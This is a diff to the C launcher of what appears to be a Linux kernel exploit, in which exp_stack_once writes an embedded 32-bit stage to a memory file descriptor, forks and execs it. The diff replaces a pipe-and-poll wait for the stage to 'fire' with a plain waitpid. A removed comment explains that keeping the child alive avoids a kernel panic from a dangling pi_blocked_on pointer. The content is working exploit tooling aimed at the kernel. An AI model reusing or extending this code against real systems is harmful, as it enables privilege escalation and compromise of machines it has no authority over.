@@ -18,7 +18,6 @@
  */
 
 #include "common.h"
-#include <poll.h>
 
 /* Embedded 32-bit stage (see src/exp32_blob.S). */
 extern const char embedded_exp32_start[];
@@ -105,13 +104,6 @@ int exp_stack_once(uint64_t *buffer) {
     return -1;
   }
 
-  int notify[2];
-  if (pipe(notify) != 0) {
-    pr_warning("exp_stack_once: pipe errno=%d\n", errno);
-    close(mfd);
-    return -1;
-  }
-
   pr_info("[exp32-launch] phase=payload-written pid=%d fd=%d bytes=%zd\n",
           getpid(), mfd, written);
   pr_info("[exp32-launch] phase=before-fork pid=%d\n", getpid());
@@ -119,24 +111,19 @@ int exp_stack_once(uint64_t *buffer) {
   if (pid < 0) {
     pr_warning("exp_stack_once: fork errno=%d\n", errno);
     close(mfd);
-    close(notify[0]);
-    close(notify[1]);
     return -1;
   }
 
   if (pid == 0) {
-    close(notify[0]);
     pr_info("[exp32-launch] phase=child-after-fork pid=%d fd=%d\n", getpid(), mfd);
     char fd_arg[16];
-    char notify_arg[16];
     const char *path = exp32_local_path();
     snprintf(fd_arg, sizeof(fd_arg), "%d", mfd);
-    snprintf(notify_arg, sizeof(notify_arg), "%d", notify[1]);
-    pr_info("[exp32-launch] phase=child-before-exec pid=%d path=%s fd=%d notify=%d\n",
-            getpid(), path, mfd, notify[1]);
+    pr_info("[exp32-launch] phase=child-before-exec pid=%d path=%s fd=%d\n",
+            getpid(), path, mfd);
     pr_info("[exp32-launch] phase=exec-syscall-enter pid=%d path=%s fd=%d\n",
             getpid(), path, mfd);
-    execl(path, path, fd_arg, notify_arg, (char *)NULL);
+    execl(path, path, fd_arg, (char *)NULL);
     /* execl only returns on error. Preserve errno for the upstream path. */
     int rmg_exec_errno = errno;
     pr_warning("[exp32-launch] phase=exec-syscall-failed pid=%d errno=%d\n",
@@ -146,30 +133,30 @@ int exp_stack_once(uint64_t *buffer) {
     _exit(127);
   }
 
-  close(notify[1]);
   pr_info("[exp32-launch] phase=parent-after-fork pid=%d child=%d\n",
           getpid(), pid);
-
-  /* Wait for the 32-bit stage to fire, then leave it alive.  Exiting the
-   * waiter after the stamp used to free its kernel stack while
-   * pi_blocked_on could still dangle — a panic class. */
-  struct pollfd pfd = { .fd = notify[0], .events = POLLIN };
-  int polled = poll(&pfd, 1, 8000);
-  char ack = 0;
-  ssize_t got = 0;
-  if (polled > 0 && (pfd.revents & POLLIN))
-    got = read(notify[0], &ack, 1);
-  close(notify[0]);
+  int status;
+  pr_info("[exp32-launch] phase=parent-wait-start pid=%d child=%d\n",
+          getpid(), pid);
+  while (waitpid(pid, &status, 0) < 0 && errno == EINTR) {
+  }
+  pr_info("[exp32-launch] phase=parent-wait-end pid=%d child=%d raw_status=%d\n",
+          getpid(), pid, status);
   close(mfd);
 
-  if (got == 1) {
-    pr_info("[exp32-launch] phase=trigger-acked pid=%d child=%d (left alive)\n",
-            getpid(), pid);
-    return 0;
+  if (WIFEXITED(status)) {
+    int exit_code = WEXITSTATUS(status);
+    if (exit_code == 127) {
+      pr_warning("exp_stack_once: executable not found at %s\n",
+                 exp32_local_path());
+      return -2;
+    }
+    return exit_code;
   }
 
-  pr_warning("[exp32-launch] phase=trigger-unacked pid=%d child=%d poll=%d "
-             "revents=%d got=%zd — leaving child alive, proceeding\n",
-             getpid(), pid, polled, pfd.revents, got);
-  return 0;
+  if (WIFSIGNALED(status)) {
+    pr_warning("exp_stack_once: child killed by signal %d\n",
+               WTERMSIG(status));
+  }
+  return -1;
 }
